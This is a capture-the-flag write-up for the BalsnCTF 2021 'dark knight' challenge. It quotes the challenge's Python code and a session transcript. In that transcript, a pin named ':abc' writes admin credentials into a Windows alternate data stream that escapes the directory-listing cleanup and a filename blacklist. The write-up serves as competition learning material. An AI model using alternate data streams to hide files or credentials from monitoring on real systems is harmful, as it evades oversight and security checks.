# dark knight - BalsnCTF 2021


# Challenge Description

dark knight

Category: Misc

Author: 424275

Verifier: nawmrofed(1hr)

Solves: 12 / 278

once upon the ime, there was a dark knight who kills every admin he met...

```markdown
nc darkknight.balsnctf.com 8084
```

# Inspection

From the provided challenge file, we know that our goal is to login with the username 'admin', then we will get the flag after entering the passcode 'plz'. 

```python
if username != None and password != None:
  print(f"hello, {username}.")
  if username == "admin":
      while True:
          x = input("do you want the flag? (y/n): ")
          if x == "n":
              print("OK, bye~")
              return
          elif x == "y":
              break
          else:
              print("invalid input.")
      while True:
          x = input("beg me: ")
          if x == "plz":
              print("ok, here is your flag: BALSN{flag is here ...}")
              break
```

There are two way to login, fast login and normal login. The normal login seems safe so we will check the fast login. We can see that there is a fast login that takes a pin code and retrieve the username and password from the file with the same name. 

```python
def fast_login():
    while True:
        pin = input("enter a pin code > ")
#... some checks on pin code
#...
				if "\\" in pin or "/" in pin or ".." in pin:
            print("what do you want to do?(¬_¬)")
            continue
#... some more checks on pin code
#...
    try:
        with open(pin, "r") as f:
            data = f.read().split("\n")
            if len(data) != 2:
                print("unknown error happened??")
                return None, None
            return data[0], data[1]
    except FileNotFoundError:
        print("this pin code is not registered.")
        return None, None
```

There is also a password manager that allow us to write our account into a file so we can login with those later. However, the server will check for all file in the directory, and delete all file that stores an admin account. 

```python
def safety_guard():
    print("safety guard activated. will delete all unsafe credentials hahaha...")
    delete_file = []
    for pin in os.listdir("."):
        safe = True
        with open(pin, "r") as f:
            data = f.read().split("\n")
            if len(data) != 2:
                safe = False
            elif len(data[0]) == 0 or len(data[1]) == 0:
                safe = False
            elif data[0].isalnum() == False or data[1].isalnum() == False:
                safe = False
            elif data[0] == "admin":
                safe = False

        if safe == False:
            os.remove(pin)
            delete_file.append(pin)
    
    print(f"finished. delete {len(delete_file)} unsafe credentials: {delete_file}")
```

# Solution

The idea will be to find a place to write the admin account without being listed by os.listdir() so that the file wouldn't be deleted. However, the black list on the file name also forced us to stay in the current directory, that means we need to find other ways to bypass the safe guard. I first tried to write directly to drive such as 'C:' but that leads to nothing, but we I was trying that, I notice some strange behaviors with the colon symbol ':'. After randomly trying different filenames, I got the flag out of pure chance

```
1. passord manager
2. login
3. exit
what do you want to do? > 1
use a short pin code to achieve fast login!!
enter a pin code > :abc
enter username > admin
enter password > 123
saved!!
1. passord manager
2. login
3. exit
what do you want to do? > 2
safety guard activated. will delete all unsafe credentials hahaha...
finished. delete 0 unsafe credentials: []
1. fast login
2. normal login
3. exit
enter login type > 1
enter a pin code > :abc
hello, admin.
do you want the flag? (y/n): y
beg me: plz
ok, here is your flag: BALSN{however_Admin_passed_the_Dark_knight_with_hiding_behind_Someone}
```

flag: `BALSN{however_Admin_passed_the_Dark_knight_with_hiding_behind_Someone}`

I later learned that I'm writing into an alternate data stream (ads), which isn't a file, so os.listdir() couldn't find it. It seems like that windows ads have been abused by many to write hidden data into the system, and have suffer bad reputations because of that.

